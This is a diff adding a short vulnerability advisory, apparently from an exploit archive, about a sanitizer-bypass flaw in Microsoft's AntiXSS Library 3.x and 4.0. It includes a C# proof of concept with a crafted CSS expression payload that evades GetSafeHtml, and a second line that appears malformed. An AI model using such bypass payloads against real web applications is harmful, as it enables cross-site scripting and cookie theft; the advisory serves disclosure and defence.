@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/51291/info
+
+Microsoft Anti-Cross Site Scripting (AntiXSS) Library is prone to a security-bypass vulnerability that affects the sanitization module.
+
+An attacker can exploit this vulnerability to bypass the filter and conduct cross-site scripting attacks. Successful exploits may allow attackers to execute arbitrary script code and steal cookie-based authentication credentials.
+
+Microsoft Anti-Cross Site Scripting Library 3.x and 4.0 are vulnerable.
+
+string data = Microsoft.Security.Application.Sanitizer.GetSafeHtml("a<style><!--div{font-family:Foo,Bar\\,'a\\a';font-family:';color:expression(alert(1));y'}--></style><div>b</div>");
+
+string data = Microsoft.Security.Application.Sanitizer.GetSafeHtmlFragment("<div style="">aaa</div>") 
